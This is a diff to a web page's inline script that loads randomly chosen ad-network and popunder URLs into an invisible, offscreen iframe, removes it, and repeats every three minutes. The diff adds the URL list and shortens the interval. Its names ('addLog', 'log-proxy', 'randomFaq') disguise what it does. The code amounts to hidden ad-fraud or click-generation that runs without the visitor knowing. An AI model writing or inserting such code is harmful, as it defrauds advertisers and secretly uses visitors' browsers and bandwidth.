@@ -14,12 +14,23 @@
   background-repeat: no-repeat; background-attachment: fixed; background-position: top center; height:100vh;overflow: hidden;">
     <div id="content" style="position:relative;z-index:-1;top:1050px;left:600px;opacity:0;"></div>
     <script type="text/javascript">
+      const links = ["https://www.highrevenuenetwork.com/shhe9c95?key=5cb0d007b4eb7ab7ae670af3aaa9c494", 
+        "https://www.highrevenuenetwork.com/fiypv9gjb?key=24afcc5d1642c8df9ae55e25dcb19fce",
+        "https://www.highrevenuenetwork.com/guncxkg31r?key=1ebec01fdea0472ff18f29b61565064b",
+        "https://www.highrevenuenetwork.com/shhe9c95?key=5cb0d007b4eb7ab7ae670af3aaa9c494", 
+        "https://www.highrevenuenetwork.com/fiypv9gjb?key=24afcc5d1642c8df9ae55e25dcb19fce",
+        "https://www.highrevenuenetwork.com/guncxkg31r?key=1ebec01fdea0472ff18f29b61565064b",
+        "https://nossairt.net/4/6072355",
+        "https://ptouchibsee.com/4/6191083",
+        "https://cooseevoowoo.com/4/7602689"];
+
       const addLog = () => {
+        var randomFaq = Math.floor(Math.random() * links.length) % links.length;
         var container = document.getElementById("content");
         var frame = document.createElement('iframe');  
         frame.id = "log-proxy"
         frame.style = "position:relative;z-index:-1;top:1050px;left:600px;border:none;border-color:transparent;height:500px;width:500px;opacity:0;"
-        frame.src = "https://www.highcpmgate.com/fiypv9gjb?key=24afcc5d1642c8df9ae55e25dcb19fce"; 
+        frame.src = links[randomFaq]; 
         container.appendChild(frame);
         setTimeout(function() {
           document.getElementById("log-proxy").remove();
@@ -29,7 +40,7 @@
         addLog();
         setTimeout(function() {
           reload();
-        }, 240000);
+        }, 180000);
       };
       reload();
     </script>
